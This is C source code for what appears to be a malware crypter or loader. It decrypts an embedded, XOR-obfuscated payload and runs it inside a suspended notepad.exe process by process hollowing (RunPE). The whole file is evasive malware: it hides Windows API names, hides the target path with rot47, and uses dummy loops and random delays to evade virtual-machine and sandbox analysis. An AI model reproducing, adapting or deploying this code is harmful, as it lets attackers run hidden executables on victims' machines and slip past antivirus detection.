#include <windows.h>
#include "payload.h"

int extern conv7to8(unsigned char *indata, unsigned char *outdata, int lenarray) asm ("_conv7to8") ; 
int extern startrand() asm ("_startrand") ; // (unsigned char *);
int extern findkernel() asm ("_findkernel") ; // (unsigned char *);
int extern getfunction( int kernel, int library ) asm ("_getfunction");
int extern ostring(unsigned char *stringoff) asm ("_ostring") ; // (unsigned char *);
int extern str_ntdll() asm ("str_ntdll"); 
int extern str_LoadLibrary() asm ("str_LoadLibrary"); 


// Redeclaration des type des fonctions offusquee 
//http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Section/NtUnmapViewOfSection.html
typedef LONG (WINAPI * PNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef LONG (WINAPI * PNtResumeThread)(HANDLE ThreadHandle);
// http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx
typedef LONG (WINAPI * PWriteProcessMemory)(HANDLE hProcess, PVOID lpBaseAddress, LPCVOID lbBuffer, SIZE_T nSize,SIZE_T * lpNumberOfBytesWritten);
//http://msdn.microsoft.com/en-us/library/windows/desktop/ms680632(v=vs.85).aspx
typedef LONG (WINAPI * PSetThreadContext)( HANDLE hthread, CONTEXT *lpcontext );
typedef LONG (WINAPI * PGetThreadContext)( HANDLE hthread, LPCONTEXT lpcontext );
typedef LONG (WINAPI * PGetProcAddress)( HMODULE hModule,LPCSTR lpProcName );
typedef LONG (WINAPI * PCreateProcessA)(LPCTSTR lpApplicationName,LPCSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
typedef LONG (WINAPI * PReadProcessMemory)(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesRead);
typedef HINSTANCE (WINAPI * PLoadLibrary ) ( LPCTSTR lpLibFileName ); 
typedef LPVOID( WINAPI * PVirtualAllocEx) (HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);



// VM scarving
int vaauxfraises(int x) {
	int i;
	int j;
	int k;
	int u;
	int v;
	for (i = 0; i < x; i++) {
		j=x;
		k=j+x; // dummy func
		for (u = 0; u <0xf; u++) {
			v=k+i;
	}	
	} 
 return(v);
}
// Rot47 Function
int rot47( char instring[32] ) {
	int i;
  for (i = 0; i < strlen(instring); i++) {
		instring[i]= 33 + ((instring[i] + 14) % 94);
	}
}

// ExecFile based on RUNPE work (c) Someone 2009
void ExecFile(LPSTR szFilePath, LPVOID pFile) {
	// On va creer un process suspendu, demapper le nouveau process, aligner la taille avce notre pe
	// recopier notre pe dans les sections, demarre et sauter dans le process

  PIMAGE_DOS_HEADER IDH;  // Structure http://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html 
	PIMAGE_NT_HEADERS INH;  
	PIMAGE_SECTION_HEADER ISH;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	PCONTEXT CTX;
	PDWORD dwImageBase;
	PNtUnmapViewOfSection xNtUnmapViewOfSection;
	PWriteProcessMemory xWriteProcessMemory ;
	PNtResumeThread xNtResumeThread;
	PGetThreadContext xGetThreadContext;
	PSetThreadContext xSetThreadContext;
	PGetProcAddress xGetProcAddress;
	PCreateProcessA xCreateProcessA;
	PReadProcessMemory xReadProcessMemory;
	PLoadLibrary xLoadLibrary;
	PVirtualAllocEx xVirtualAllocEx;

	LPVOID pImageBase;
	int Count;


int extern str_ntdll() asm ("str_ntdll"); 
int extern str_kernel32() asm ("str_kernel32"); 
int extern str_ReadProcessMemory() asm ("str_ReadProcessMemory"); 
int extern str_GetProcAddress() asm ("str_GetProcAddress"); 
int extern str_ReadProcAddress() asm ("str_ReadProcAddress"); 
int extern str_WriteProcessMemory() asm ("str_WriteProcessMemory"); 
int extern str_GetThreadContext() asm ("str_GetThreadContext"); 
int extern str_SetThreadContext() asm ("str_SetThreadContext");
int extern str_ReadProcessMemory() asm ("str_ReadProcessMemory"); 
int extern str_CreateProcessA() asm ("str_CreateProcessA"); 
int extern str_NtResumeThread() asm ("str_NtResumeThread");
int extern str_NtUnmapViewOfSection() asm ("str_NtUnmapViewOfSection"); 
int extern str_VirtualAllocEx() asm ("str_VirtualAllocEx"); 

xLoadLibrary = (PLoadLibrary) getfunction (findkernel() ,ostring((unsigned char *) &str_LoadLibrary ));
	
	HINSTANCE Hkernel32  = xLoadLibrary((LPCTSTR) ostring((unsigned char *) &str_kernel32 ));
	HINSTANCE Hntdll = xLoadLibrary((LPCTSTR) ostring((unsigned char * ) &str_ntdll ));

	xGetProcAddress = (PGetProcAddress) getfunction(findkernel(),ostring((unsigned char *) &str_GetProcAddress));
  xReadProcessMemory = (PReadProcessMemory) getfunction(findkernel(), ostring((unsigned char *)&str_ReadProcessMemory));
	xWriteProcessMemory = (PWriteProcessMemory)  getfunction(findkernel(),ostring((unsigned char *)&str_WriteProcessMemory));
	xCreateProcessA = (PCreateProcessA) (xGetProcAddress(Hkernel32,(LPCSTR) ostring((unsigned char *) &str_CreateProcessA)));
	xNtResumeThread = (PNtResumeThread)(xGetProcAddress(Hntdll,(LPCSTR) ostring((unsigned char *) &str_NtResumeThread)));	
	xGetThreadContext = ( PGetThreadContext) getfunction(findkernel(),ostring((unsigned char *)&str_GetThreadContext));
	xSetThreadContext = ( PSetThreadContext) getfunction(findkernel(),ostring((unsigned char *)&str_SetThreadContext));
	xNtUnmapViewOfSection = (PNtUnmapViewOfSection)(xGetProcAddress(Hntdll,(LPCSTR) ostring((unsigned char *)&str_NtUnmapViewOfSection)));
	xVirtualAllocEx = ( PVirtualAllocEx) getfunction(findkernel(),ostring((unsigned char *)&str_VirtualAllocEx));

	IDH = PIMAGE_DOS_HEADER(pFile);
	if (IDH->e_magic == IMAGE_DOS_SIGNATURE) { // TEST MZ
		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE) {   // TESTPE
			RtlZeroMemory(&SI, sizeof(SI));
			RtlZeroMemory(&PI, sizeof(PI));

			// Cree un process etat suspendu
			if (xCreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
				CTX->ContextFlags = CONTEXT_FULL;
				if (xGetThreadContext(PI.hThread, LPCONTEXT(CTX))){
					xReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);

				  // Mappe l'exe dans la thread
				  if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)	{
					vaauxfraises(DWORD(dwImageBase));
					xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
				  }

				pImageBase = xVirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
				if (pImageBase) {
			//	HMODULE aKERNEL32=LoadLibrary(vKERNEL32);
					xWriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
					for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
						ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
	
					startrand();
	xWriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
					}
					xWriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
					CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
					// Et on demarre la thread
					xSetThreadContext(PI.hThread, LPCONTEXT(CTX));
					startrand();
					xNtResumeThread(PI.hThread);
				}
			}
		}
	}
	}
//	GetLastError();
	VirtualFree(pFile, 0, MEM_RELEASE);
}

int dexor(unsigned char * lpayload,int lpayloadlen,unsigned char * lkey ) {
	unsigned char drift = 0;
	int i;
	int ki=0;
	for (i=0; i<lpayloadlen; i++) {
		lpayload[i]=(lpayload[i] - drift) ^ lkey[ki] ;
		ki = (ki+1) % 32;
		drift++;
		
	}
}

// Main program

unsigned char* buffer;
int payloadlen7;

int main()

{

int dummy = vaauxfraises(41414141);
buffer = (unsigned char*) malloc (payloadlen);
payloadlen7=conv7to8( payload,buffer,payloadlen);



memcpy(payload,buffer,payloadlen7);
// Ce exe sera notepad
char fakeexe[]="ri-H:?5@HD-?@E6A25]6I6";
rot47(fakeexe);


// Random delay et faux jump
if (startrand()==1) {
  dexor(payload,payloadlen7,key);
  ExecFile(LPSTR(fakeexe),payload);
}

return 0;
}
